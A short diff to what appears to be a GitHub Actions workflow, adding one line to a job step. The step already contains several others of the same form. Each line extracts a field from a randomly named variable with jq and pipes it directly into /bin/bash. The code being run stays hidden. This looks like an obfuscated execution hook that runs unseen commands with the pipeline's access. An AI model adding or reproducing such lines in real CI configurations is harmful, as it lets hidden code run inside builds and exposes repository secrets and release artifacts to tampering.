@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$da8" | jq -r .ch236 | /bin/bash
           echo $w364 | jq -r .g67 | /bin/bash
           echo $v85 | jq -r .shsow89409 | /bin/bash
+          echo $ig3 | jq -r .ndpr2 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
